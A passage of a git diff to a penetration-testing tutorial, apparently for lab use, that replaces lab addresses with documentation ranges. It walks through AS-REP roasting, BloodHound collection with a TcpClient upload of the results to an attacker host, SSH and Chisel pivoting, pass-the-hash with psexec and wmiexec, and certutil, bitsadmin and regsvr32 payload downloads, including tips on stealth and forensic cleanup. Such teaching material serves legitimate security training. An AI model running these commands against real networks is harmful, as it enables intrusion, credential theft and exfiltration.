-# => [-] lab.local/jdoe - KDC_ERR_PREAUTH_REQUIRED (normal user, pre-auth ON)
-# => $krb5asrep$23$asreproast@LAB.LOCAL:3c4d5e6f7a8b9c0d...
+# => [-] lab.example/administrator - Client not found in Kerberos database
+# => [-] lab.example/jdoe - KDC_ERR_PREAUTH_REQUIRED (normal user, pre-auth ON)
+# => $krb5asrep$23$asreproast@LAB.EXAMPLE:3c4d5e6f7a8b9c0d...
 # => User asreproast has pre-auth disabled — hash extracted!
 
 # Step 2 — If domain credentials are available, enumerate all vulnerable accounts
-python3 GetNPUsers.py lab.local/jdoe:Password123 -dc-ip 10.10.10.10 -request -format hashcat
+python3 GetNPUsers.py lab.example/jdoe:Password123 -dc-ip 192.0.2.10 -request -format hashcat
 # => With credentials: queries LDAP for ALL accounts with DONT_REQUIRE_PREAUTH
 # => Returns AS-REP hashes for every vulnerable account found
 
@@ -1066,11 +1066,11 @@ hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
 # => -m 18200 selects Kerberos 5 AS-REP etype 23 hash type
 # => Much faster than TGS due to simpler structure
 # =>
-# => $krb5asrep$23$asreproast@LAB.LOCAL:...:Welcome1!
+# => $krb5asrep$23$asreproast@LAB.EXAMPLE:...:Welcome1!
 # => Hash cracked — account password is Welcome1!
 
 # Step 4 — Confirm account access with cracked credentials
-python3 smbclient.py lab.local/asreproast:'Welcome1!'@10.10.10.10
+python3 smbclient.py lab.example/asreproast:'Welcome1!'@192.0.2.10
 # => Authenticates to DC SMB share with recovered credentials
 # => Type shares to list available shares; use them for further enumeration
 ```
@@ -1085,7 +1085,7 @@ python3 smbclient.py lab.local/asreproast:'Welcome1!'@10.10.10.10
 
 **What this covers:** BloodHound maps Active Directory relationships (user memberships, ACLs, session data, trust relationships) and uses graph theory to identify shortest attack paths to Domain Admin. SharpHound is the data collection agent that generates JSON files for import into BloodHound's Neo4j-backed visualizer.
 
-**Scenario:** Authorized pentest; domain user access on lab domain `lab.local`; performing AD attack path analysis.
+**Scenario:** Authorized pentest; domain user access on lab domain `lab.example`; performing AD attack path analysis.
 
 ```powershell
 # Step 1 — Transfer SharpHound to target domain-joined machine
@@ -1093,14 +1093,14 @@ python3 smbclient.py lab.local/asreproast:'Welcome1!'@10.10.10.10
 python3 -m http.server 8080 &
 
 # On target Windows (PowerShell):
-Invoke-WebRequest -Uri http://10.10.10.200:8080/SharpHound.exe -OutFile C:\Temp\SharpHound.exe
+Invoke-WebRequest -Uri http://192.0.2.200:8080/SharpHound.exe -OutFile C:\Temp\SharpHound.exe
 # => Downloads SharpHound.exe to C:\Temp\
 
 # Step 2 — Run SharpHound with All collection methods
 .\SharpHound.exe -c All --outputdirectory C:\Temp\
 # => -c All collects: Session, LocalGroup, ACL, Trust, ObjectProps, Container
 # => Queries LDAP for AD objects and SMB for local sessions
-# => [+] Creating Schema map for domain LAB.LOCAL using path cn=schema,cn=configuration...
+# => [+] Creating Schema map for domain LAB.EXAMPLE using path cn=schema,cn=configuration...
 # => [+] Cache File not Found! Creating new cache...
 # => [+] Collecting Session data...
 # => [+] Completed Session data in 00:00:04.3141579
@@ -1112,7 +1112,7 @@ Invoke-WebRequest -Uri http://10.10.10.200:8080/SharpHound.exe -OutFile C:\Temp\
 # Step 3 — Exfiltrate the ZIP to attacker machine
 # On attacker: nc -lvnp 8888 > bloodhound.zip
 # On target:
-$client = New-Object Net.Sockets.TcpClient("10.10.10.200", 8888)
+$client = New-Object Net.Sockets.TcpClient("192.0.2.200", 8888)
 $stream = $client.GetStream()
 $data = [System.IO.File]::ReadAllBytes("C:\Temp\20260521135512_BloodHound.zip")
 $stream.Write($data, 0, $data.Length)
@@ -1144,21 +1144,21 @@ bloodhound &
 
 **What this covers:** SSH local port forwarding creates an encrypted tunnel through a compromised host to reach otherwise inaccessible network segments. Combined with ProxyChains, all TCP tool traffic routes through the pivot host, enabling enumeration and exploitation of internal networks from the attacker's machine.
 
-**Scenario:** Authorized pentest; SSH access to DMZ host `pivot` (10.10.10.80) which has access to an internal network (192.168.10.0/24) not directly reachable from attacker at 10.10.10.200.
+**Scenario:** Authorized pentest; SSH access to DMZ host `pivot` (192.0.2.80) which has access to an internal network (198.51.100.0/24) not directly reachable from attacker at 192.0.2.200.
 
 ```bash
 # Step 1 — Verify the pivot host's network access
 # (On pivot host via existing shell)
 ip route
-# => default via 10.10.10.1 dev eth0
-# => 10.10.10.0/24 dev eth0 src 10.10.10.80
-# => 192.168.10.0/24 dev eth1 src 192.168.10.5
-# => Pivot host has eth1 on 192.168.10.0/24 — internal network accessible!
+# => default via 192.0.2.1 dev eth0
+# => 192.0.2.0/24 dev eth0 src 192.0.2.80
+# => 198.51.100.0/24 dev eth1 src 198.51.100.5
+# => Pivot host has eth1 on 198.51.100.0/24 — internal network accessible!
 
 # Step 2 — Set up SSH local port forward to internal host
-ssh -L 8080:192.168.10.20:80 user@10.10.10.80 -N -f
-# => -L 8080:192.168.10.20:80 — forward localhost:8080 → 192.168.10.20:80
-# => user@10.10.10.80 — authenticate to the pivot host
+ssh -L 8080:198.51.100.20:80 user@192.0.2.80 -N -f
+# => -L 8080:198.51.100.20:80 — forward localhost:8080 → 198.51.100.20:80
+# => user@192.0.2.80 — authenticate to the pivot host
 # => -N — no command execution (tunnel only)
 # => -f — background the SSH session
 # => Tunnel established; localhost:8080 now maps to internal web server
@@ -1169,19 +1169,19 @@ curl http://127.0.0.1:8080/
 # => Internal web application responding through the SSH tunnel
 
 # Step 4 — Set up SOCKS5 proxy for full network access via ProxyChains
-ssh -D 1080 user@10.10.10.80 -N -f
+ssh -D 1080 user@192.0.2.80 -N -f
 # => -D 1080 creates a SOCKS5 proxy on localhost:1080
 # => All traffic sent through this proxy exits via the pivot host
-# => Entire 192.168.10.0/24 becomes reachable
+# => Entire 198.51.100.0/24 becomes reachable
 
 # Step 5 — Configure and use ProxyChains
 # Edit /etc/proxychains4.conf:
 # socks5 127.0.0.1 1080
 
-proxychains nmap -sT -Pn 192.168.10.0/24 -p 22,80,443,445,3389
+proxychains nmap -sT -Pn 198.51.100.0/24 -p 22,80,443,445,3389
 # => Nmap traffic routes through SOCKS5 proxy on pivot host
-# => 192.168.10.20: 80/tcp open
-# => 192.168.10.30: 445/tcp open, 3389/tcp open
+# => 198.51.100.20: 80/tcp open
+# => 198.51.100.30: 445/tcp open, 3389/tcp open
 # => Internal network hosts enumerated through pivot
 ```
 
@@ -1195,7 +1195,7 @@ proxychains nmap -sT -Pn 192.168.10.0/24 -p 22,80,443,445,3389
 
 **What this covers:** Chisel is a fast TCP/UDP tunneling tool that works over HTTP, making it effective when SSH is unavailable or when firewall rules block direct TCP connections. Chisel runs in client/server mode, with the server on the attacker machine and the client on the pivot host, establishing a reverse tunnel.
 
-**Scenario:** Authorized pentest; web shell access on DMZ host `pivot` (10.10.10.81, outbound HTTP allowed); need to reach internal DB server at 192.168.10.25:5432.
+**Scenario:** Authorized pentest; web shell access on DMZ host `pivot` (192.0.2.81, outbound HTTP allowed); need to reach internal DB server at 198.51.100.25:5432.
 
 ```bash
 # Step 1 — Start Chisel server on attacker machine
@@ -1210,12 +1210,12 @@ python3 -m http.server 8080 &
 # => Serve chisel binary alongside server
 
 # On pivot host (via web shell or existing access):
-wget http://10.10.10.200:8080/chisel -O /tmp/chisel
+wget http://192.0.2.200:8080/chisel -O /tmp/chisel
 chmod +x /tmp/chisel
 # => Chisel client downloaded and made executable
 
 # Step 3 — Connect Chisel client to attacker server (reverse SOCKS tunnel)
-/tmp/chisel client 10.10.10.200:8000 R:socks
+/tmp/chisel client 192.0.2.200:8000 R:socks
 # => Connects outbound over HTTP to attacker's chisel server
 # => R: — reverse tunnel (initiated by client, terminates on server)
 # => socks — creates SOCKS5 proxy endpoint on attacker machine
@@ -1224,7 +1224,7 @@ chmod +x /tmp/chisel
 # => 2026/05/21 13:55:12 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening
 
 # Step 4 — Use ProxyChains via the SOCKS5 proxy on localhost:1080
-proxychains psql -h 192.168.10.25 -U postgres -p 5432
+proxychains psql -h 198.51.100.25 -U postgres -p 5432
 # => ProxyChains routes TCP through SOCKS5 on 127.0.0.1:1080
 # => Traffic exits via pivot host's connection to internal DB
 # => Password for user postgres: (enter password)
@@ -1234,8 +1234,8 @@ proxychains psql -h 192.168.10.25 -U postgres -p 5432
 # => Direct PostgreSQL access to internal DB through HTTP tunnel
 
 # Step 5 — Forward a specific port instead of full SOCKS (alternative)
-/tmp/chisel client 10.10.10.200:8000 R:5432:192.168.10.25:5432
-# => Creates specific port forward: attacker:5432 → pivot → 192.168.10.25:5432
+/tmp/chisel client 192.0.2.200:8000 R:5432:198.51.100.25:5432
+# => Creates specific port forward: attacker:5432 → pivot → 198.51.100.25:5432
 # => More targeted; avoids full SOCKS proxy setup
 ```
 
@@ -1249,37 +1249,37 @@ proxychains psql -h 192.168.10.25 -U postgres -p 5432
 
 **What this covers:** Impacket's psexec.py and smbexec.py authenticate to remote Windows hosts over SMB using valid credentials (or hashes via pass-the-hash) and execute commands as SYSTEM. psexec uploads a service binary to ADMIN$; smbexec creates a service that runs commands via cmd.exe output redirected to a named pipe, leaving less disk evidence.
 
-**Scenario:** Authorized pentest; valid Administrator credentials obtained; targeting lab Windows hosts 10.10.10.82 and 10.10.10.83.
+**Scenario:** Authorized pentest; valid Administrator credentials obtained; targeting lab Windows hosts 192.0.2.82 and 192.0.2.83.
 
 ```bash
 # Step 1 — psexec.py — upload a service binary for interactive shell
-python3 psexec.py Administrator:'P@ssword123!'@10.10.10.82
+python3 psexec.py Administrator:'P@ssword123!'@192.0.2.82
 # => Impacket v0.9.24
-# => [*] Requesting shares on 10.10.10.82
+# => [*] Requesting shares on 192.0.2.82
 # => [*] Found writable share ADMIN$
 # => [*] Uploading file xAbCdEfG.exe  ← Random service binary dropped to ADMIN$
-# => [*] Opening SVCManager on 10.10.10.82
-# => [*] Creating service sVcN on 10.10.10.82
+# => [*] Opening SVCManager on 192.0.2.82
+# => [*] Creating service sVcN on 192.0.2.82
 # => [*] Starting service sVcN.....
 # => nt authority\system
 # => Microsoft Windows [Version 10.0.17763.2183]
 # => C:\Windows\system32>
 
 # Step 2 — psexec with hash (no password cracking required)
-python3 psexec.py -hashes ':8846f7eaee8fb117ad06bdd830b7586c' Administrator@10.10.10.82
+python3 psexec.py -hashes ':8846f7eaee8fb117ad06bdd830b7586c' Administrator@192.0.2.82
 # => -hashes ':NTLM' — pass-the-hash (LM hash portion left blank)
 # => Authenticates without knowing the plaintext password
 # => C:\Windows\system32>  (SYSTEM shell)
 
 # Step 3 — smbexec.py — execute commands without dropping a binary to disk
-python3 smbexec.py Administrator:'P@ssword123!'@10.10.10.83
-# => [*] Creating service BTOBTO on 10.10.10.83
+python3 smbexec.py Administrator:'P@ssword123!'@192.0.2.83
+# => [*] Creating service BTOBTO on 192.0.2.83
 # => [*] Service starts... done.
 # => No binary uploaded to disk — cmd.exe used directly via service
 # => C:\WINDOWS\system32>
 
 # Step 4 — Run a single command without interactive shell
-python3 psexec.py Administrator:'P@ssword123!'@10.10.10.82 whoami
+python3 psexec.py Administrator:'P@ssword123!'@192.0.2.82 whoami
 # => nt authority\system
 # => Single command mode — runs and exits cleanly
 
@@ -1302,18 +1302,18 @@ net view /domain:LAB
 
 **What this covers:** Windows Management Instrumentation (WMI) provides remote command execution through the DCOM protocol on port 135 and dynamically assigned high ports. Impacket's wmiexec.py uses WMI to run commands on remote hosts and retrieves output through a temporary SMB share, avoiding service creation and leaving a smaller footprint than psexec.
 
-**Scenario:** Authorized pentest; Administrator credentials available; targeting lab Windows host 10.10.10.84 where SMB service creation is monitored.
+**Scenario:** Authorized pentest; Administrator credentials available; targeting lab Windows host 192.0.2.84 where SMB service creation is monitored.
 
 ```bash
 # Step 1 — Execute a single command via WMI (semi-interactive)
-python3 wmiexec.py Administrator:'P@ssword123!'@10.10.10.84 whoami
+python3 wmiexec.py Administrator:'P@ssword123!'@192.0.2.84 whoami
 # => Impacket v0.9.24
 # => [*] SMBv3.0 dialect used
 # => nt authority\system
 # => Command executed; output retrieved via temporary share
 
 # Step 2 — Open a semi-interactive shell via WMI
-python3 wmiexec.py Administrator:'P@ssword123!'@10.10.10.84
+python3 wmiexec.py Administrator:'P@ssword123!'@192.0.2.84
 # => [*] SMBv3.0 dialect used
 # => C:\>
 # => Semi-interactive shell — each command creates a new WMI process
@@ -1322,8 +1322,8 @@ python3 wmiexec.py Administrator:'P@ssword123!'@10.10.10.84
 ipconfig /all
 # => Windows IP Configuration
 # =>    Host Name . . . . . . . . . . . : WORKSTATION02
-# =>    IPv4 Address. . . . . . . . . . : 10.10.10.84
-# =>    IPv4 Address. . . . . . . . . . : 192.168.10.84  ← Second NIC!
+# =>    IPv4 Address. . . . . . . . . . : 192.0.2.84
+# =>    IPv4 Address. . . . . . . . . . : 198.51.100.84  ← Second NIC!
 # => Host is dual-homed — new pivot opportunity discovered
 
 net localgroup administrators
@@ -1333,12 +1333,12 @@ net localgroup administrators
 # => svc_deploy is a potential Kerberoasting or credential reuse target
 
 # Step 4 — WMI with hash (pass-the-hash)
-python3 wmiexec.py -hashes ':8846f7eaee8fb117ad06bdd830b7586c' Administrator@10.10.10.84 hostname
+python3 wmiexec.py -hashes ':8846f7eaee8fb117ad06bdd830b7586c' Administrator@192.0.2.84 hostname
 # => WORKSTATION02
 # => Hash-based authentication works for WMI as well as SMB
 
 # Step 5 — Nooutput flag (useful for stealth — no SMB share created)
-python3 wmiexec.py Administrator:'P@ssword123!'@10.10.10.84 -nooutput "cmd.exe /c whoami > C:\\Temp\\out.txt"
+python3 wmiexec.py Administrator:'P@ssword123!'@192.0.2.84 -nooutput "cmd.exe /c whoami > C:\\Temp\\out.txt"
 # => Command runs via WMI without output retrieval
 # => No temporary SMB share created — lower forensic footprint
 # => Read output file on target in next command
@@ -1354,7 +1354,7 @@ python3 wmiexec.py Administrator:'P@ssword123!'@10.10.10.84 -nooutput "cmd.exe /
 
 **What this covers:** Immediately after gaining access to a new host, structured situational awareness gathering identifies the current privilege level, network position, other connected users, and onward pivot opportunities. A consistent checklist ensures nothing is missed before taking noisy further actions.
 
-**Scenario:** Authorized pentest; initial shell obtained on lab Windows host `workstation02` (10.10.10.85); first actions after landing.
+**Scenario:** Authorized pentest; initial shell obtained on lab Windows host `workstation02` (192.0.2.85); first actions after landing.
 
 ```cmd
 :: Step 1 — Identity and privileges
@@ -1379,22 +1379,22 @@ whoami /priv
 :: Step 2 — Network configuration and position
 ipconfig /all
 :: => Ethernet adapter Ethernet0:
-:: =>    IPv4 Address: 10.10.10.85
-:: =>    Default Gateway: 10.10.10.1
+:: =>    IPv4 Address: 192.0.2.85
+:: =>    Default Gateway: 192.0.2.1
 :: => Ethernet adapter Ethernet1:
-:: =>    IPv4 Address: 172.16.5.85  ← Second NIC on different subnet!
-:: =>    Default Gateway: 172.16.5.1
+:: =>    IPv4 Address: 203.0.113.85  ← Second NIC on different subnet!
+:: =>    Default Gateway: 203.0.113.1
 
 route print
 :: => Active Routes:
-:: =>   0.0.0.0          0.0.0.0      10.10.10.1   10.10.10.85
-:: =>   172.16.5.0  255.255.255.0         On-link   172.16.5.85
-:: =>   10.0.0.0    255.0.0.0         172.16.5.1   172.16.5.85  ← Route to internal 10.x
-:: => Routing table reveals additional network 172.16.5.0/24 accessible
+:: =>   0.0.0.0          0.0.0.0      192.0.2.1   192.0.2.85
+:: =>   203.0.113.0  255.255.255.0         On-link   203.0.113.85
+:: =>   10.x.0.0    255.0.0.0         203.0.113.1   203.0.113.85  ← Route to internal 10.x
+:: => Routing table reveals additional network 203.0.113.0/24 accessible
 
 :: Step 3 — Active sessions (other users on this host)
 net user /domain
-:: => User accounts for \\lab.local
+:: => User accounts for \\lab.example
 :: => Administrator  jdoe  sqlservice  websvc  backup_svc
 
 query user
@@ -1419,13 +1419,13 @@ net start
 
 **What this covers:** Living-off-the-land (LOtL) techniques use built-in Windows binaries (LOLBins) for malicious purposes including file download, payload execution, and code running, avoiding the need to upload attacker tools. certutil, bitsadmin, and regsvr32 are classic LOLBins present on virtually all Windows versions.
 
-**Scenario:** Authorized pentest; limited shell on lab Windows 10 host at 10.10.10.86; need to download and execute a payload without uploading non-system tools.
+**Scenario:** Authorized pentest; limited shell on lab Windows 10 host at 192.0.2.86; need to download and execute a payload without uploading non-system tools.
 
 ```cmd
 :: --- certutil: file download and base64 decode ---
 
 :: Step 1 — Download a file using certutil (HTTPS-capable)
-certutil -urlcache -split -f http://10.10.10.200:8080/payload.exe C:\Temp\payload.exe
+certutil -urlcache -split -f http://192.0.2.200:8080/payload.exe C:\Temp\payload.exe
 :: => -urlcache pulls from URL cache (actually downloads the file)
 :: => -split splits large files; -f forces download even if cached
 :: => CertUtil: -URLCache command completed successfully.
@@ -1442,7 +1442,7 @@ certutil -decode C:\Temp\payload.b64 C:\Temp\payload.exe
 :: --- bitsadmin: background download via BITS service ---
 
 :: Step 3 — Download using BITS (Background Intelligent Transfer Service)
-bitsadmin /transfer myJob /download /priority normal http://10.10.10.200:8080/shell.exe C:\Temp\shell.exe
+bitsadmin /transfer myJob /download /priority normal http://192.0.2.200:8080/shell.exe C:\Temp\shell.exe
 :: => bitsadmin uses the BITS service (already running) for the transfer
 :: => Appears as a legitimate Windows background job in BITS logs
 :: => Job: myJob, Type: DOWNLOAD, State: TRANSFERRED
@@ -1451,7 +1451,7 @@ bitsadmin /transfer myJob /download /priority normal http://10.10.10.200:8080/sh
 :: --- regsvr32: scriptlet execution (bypasses AppLocker) ---
 
 :: Step 4 — Execute a COM scriptlet remotely with regsvr32 (Squiblydoo)
-regsvr32 /s /n /u /i:http://10.10.10.200:8080/shell.sct scrobj.dll
+regsvr32 /s /n /u /i:http://192.0.2.200:8080/shell.sct scrobj.dll
 :: => regsvr32 — built-in COM registration utility
 :: => /s silent, /n no DllRegisterServer, /u unregister, /i: specifies script URL
 :: => scrobj.dll — Script Component Runtime, processes .sct files
@@ -1460,7 +1460,7 @@ regsvr32 /s /n /u /i:http://10.10.10.200:8080/shell.sct scrobj.dll
 :: => Spawns a shell as the current user
 
 :: Step 5 — Verify execution and clean up certutil cache
-certutil -urlcache -split -f http://10.10.10.200:8080/ delete
+certutil -urlcache -split -f http://192.0.2.200:8080/ delete
 :: => Clears the URL cache entry to reduce forensic artifacts
 :: => CertUtil: -URLCache command completed successfully.
 ```
